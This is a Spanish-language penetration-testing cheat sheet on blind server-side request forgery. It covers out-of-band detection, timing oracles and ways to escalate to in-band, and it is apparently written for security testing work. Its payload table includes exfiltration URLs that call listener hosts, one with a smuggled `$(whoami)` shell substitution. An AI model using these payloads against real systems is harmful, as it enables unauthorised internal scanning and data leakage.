---
aliases:
  - Blind SSRF
  - Out-of-Band SSRF
  - Time-based SSRF
tags:
  - type/technique
  - vuln/ssrf
  - technique/exfiltration
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Server-Side Request Forgery (SSRF)]]'
---
# SSRF - Blind SSRF

***

## Cheatsheet

| **Canal** | **Payload** | **Señal** |
|:---:|:---:|---|
| **DNS OOB (Burp Collaborator)** | `http://abc123.oastify.com/` | DNS query log en listener — confirma SSRF mínimo. |
| **DNS exfil encoded** | `http://$(whoami).abc123.oastify.com/` | Respuesta embebida en subdominio (si backend interpola). |
| **HTTP OOB** | `http://abc123.oastify.com/?data=<leaked>` | Query string captura output de subcomando. |
| **Timing diff (port open)** | `http://127.0.0.1:22/` vs `http://127.0.0.1:9999/` | Puerto abierto = conexión rápida; cerrado = timeout largo o refused rápido. |
| **Error-based diff** | Comparar tamaño de respuesta / status code | Interno "404 Not Found" ≠ externo "503 Gateway Timeout". |
| **Interactsh** | `http://abc.oast.me/` | Server-side interactsh listener (alternativa a Collaborator). |
^ssrf-blind

___

## Overview

SSRF **blind** = la respuesta del fetch interno NO se refleja al atacante. El servidor consume la URL pero no muestra el body (o lo consume silenciosamente — logger, webhook, avatar fetcher). Vector aún explotable via **out-of-band (OOB)** o **inferencia**.

Detection checklist:
1. Proveer URL a tu Collaborator → ver si hay DNS/HTTP hit.
2. Si hit llega: confirmado SSRF (al menos DNS resolution).
3. Probar protocolos internos (loopback, LAN) — inferir via timing.

### Mecanismos de Acción

- **DNS exfil**: payload con subdomain `<data>.collab.net` — si backend interpola variables shell / template, el subdominio leakea info. Limitado a 63 chars por label, charset DNS-safe.
- **Timing oracles**:
  - Puerto abierto pero no HTTP → server intenta TLS handshake → lag X ms.
  - Puerto cerrado → refused inmediato (ms).
  - Puerto filtered → timeout (segundos).
  - Discriminar 3 estados = mini port scan.
- **Behavior diff**: diff entre request con URL válida vs `http://nonexistent-internal.local/` — status code, latency, error body → fingerprint.
- **Second-order SSRF**: primer SSRF no responde pero dispara webhook / email que sí llega; persistent log aparece en admin panel accesible al atacante.

### Escalar blind a in-band

- **Redirect tricks**: el atacante sirve `302 Location: http://internal-only/secret` — si backend sigue redirects, puede extraer body pasando por proxy atacante intermedio (TLS unwrap).
- **CRLF inj + HTTP smuggling**: si CR/LF pasan, inyectar headers para split response.
- **XXE-SSRF chain**: si backend parsea XML, `<!ENTITY xxe SYSTEM "http://internal"> ` leakea body en error parse.

### Tools

| Tool | Uso |
|---|---|
| **Burp Collaborator** | Listener OOB built-in Burp Suite Pro. |
| **interactsh** | `interactsh-client` ProjectDiscovery — alternativa gratuita. |
| **Smuggler** | HTTP smuggling detection. |
| **SSRFmap** | Auto-explota SSRF detectados (gopher + fingerprint). |

***
